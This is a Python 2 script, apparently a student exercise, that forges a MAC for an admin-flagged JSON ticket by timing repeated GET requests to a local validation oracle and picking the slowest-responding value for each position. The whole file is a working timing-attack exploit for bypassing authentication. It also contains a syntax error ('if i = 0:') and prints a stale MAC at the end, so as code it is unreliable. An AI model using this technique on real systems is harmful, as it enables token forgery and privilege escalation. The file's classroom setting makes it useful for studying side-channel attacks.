#!/usr/bin/env python

# Use timing attack to generate a valid MAC without secret key
#
# Author: Shi Su, AndrewId:shis
# 11/01/2015

import nanotime
import httplib
import argparse
import binascii
import operator

ORACLE_HOST = "127.0.0.1"
QUERY_PATH = "/auth.php?"
RETRY = 800

"""
    generate ticket according to command line argument
"""
def generate_ticket():
    if (args.username is None):
        username = "shis" #shis
    else:
        username = args.username

    if (args.is_admin is None):
        is_admin = "true" #true
    else:
        is_admin = args.is_admin

    if (args.expiration is None):
        expiration = "2022-01-31" #2022-01-31
    else:
        expiration = args.expiration

    return "{\"username\":\""+ username +"\",\"is_admin\":\""+ is_admin +"\",\"expired\":\""+expiration+"\"}"


"""
    convert int array to hex string
"""
def to_hex_string(array):
    str=""
    for i in range (0, 32):
        str = str + hex(array[i]).replace("0x","")
    return str


""" 
    Ask oracle if the ticket has valid MAC  by making GET request 
    but the only thing we care if the response time
    Query: ticket=xxx&mac=yyy
"""
def validate_MAC(query):
    conn = httplib.HTTPConnection(ORACLE_HOST)
    conn.request("GET", QUERY_PATH + query)
    resp = conn.getresponse()

"""
    calculate the interval between request and response
"""
def get_response_time(query):
    before = nanotime.now()
    validate_MAC(query)
    after = nanotime.now()
    return int(after - before)

"""
    For each byte of MAC, try multiple times to obtain 
    the value of longest response time from validation server
    which is the correct byte value for the MAC
"""
def timing_attack():

    ticket = generate_ticket()
    print ticket

    MAC = ""
    # initialize array
    MAC_array = bytearray([0] * 32)
    dict_progress = []
    dict_time = {}

    for i in range (0, 32):
        # One time result maybe unreliable, 
        for j in range (0, 16):
            if i = 0:
                dict_progress.append([])
            for k in range (0, RETRY):
                # from left to right, test the value of one byte
                print str(i)+",("+str(k+1)+"/"+str(RETRY)+"),"+str(j)

                MAC_array[i] = j
                MAC = to_hex_string(MAC_array)
                print "mac: " + MAC

                query = "ticket=" + ticket + "&mac=" + MAC
                interval = get_response_time(query)
                print "interval: " + str(interval)

                # add the response time to dictionary with previous result
                # if not j in dict_time:
                #     #dict_time[j] = interval
                #     dict_progress[j].append(interval)
                # else:
                    #if not interval > dict_time[j] * 2:
                    #dict_time[j] = interval + dict_time[j]
                dict_progress[j].append(interval)
		    # get the average from the 400 smallest response time 
            dict_progress[j].sort()
            sum = 0
            for n in range (0, 400):
                sum += dict_progress[j][n]
            dict_time[j] = sum/400 
            dict_progress[j][:]=[]
	    #dict_time[j] = dict_time[j] / k
        # the one with statistically longest resonse time in one set of character
        # is the valid character in mac 
        MAC_array[i] = max(dict_time.iteritems(), key=operator.itemgetter(1))[0]
        # clean the dictonary for next character
        dict_time.clear()

    print "mac: " + MAC


if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='Encrypted a ticket with given information')
   parser.add_argument('-u','--username', help='Username')
   parser.add_argument('-a','--is_admin', help='Is the user admin, true/false')
   parser.add_argument('-e','--expiration', help='Expiration date of the ticket, e.g. 2015-10-07')
   args = parser.parse_args()
   timing_attack()
